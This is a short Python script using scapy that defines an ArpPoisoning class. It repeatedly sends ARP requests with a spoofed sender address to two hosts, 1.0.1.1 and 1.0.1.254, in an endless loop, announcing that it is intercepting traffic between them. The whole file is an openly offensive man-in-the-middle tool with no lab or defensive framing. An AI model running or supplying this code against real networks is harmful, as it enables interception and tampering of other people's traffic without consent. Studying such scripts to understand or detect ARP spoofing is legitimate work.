__author__ = 'root'

from scapy.all import *
import sys


class ArpPoisoning:

    def __init__(self):
        self.interceptList = []

    def add_intercept_entry(self, sender, receiver):
        self.interceptList.append({'sender': sender, 'receiver': receiver})

    def launch_attack(self):
        while True:
            for interceptEntry in self.interceptList:
                print('Intercepting traffic between ' + interceptEntry['sender'] + ' and ' + interceptEntry['receiver'])
                op = 1  # ARP request
                arp_request_packet = ARP()
                arp_request_packet.op = op
                arp_request_packet.psrc = interceptEntry['sender']
                arp_request_packet.pdst = interceptEntry['receiver']

                send(arp_request_packet)





arp = ArpPoisoning()
arp.add_intercept_entry('1.0.1.1', '1.0.1.254')
arp.add_intercept_entry('1.0.1.254', '1.0.1.1')

arp.launch_attack()
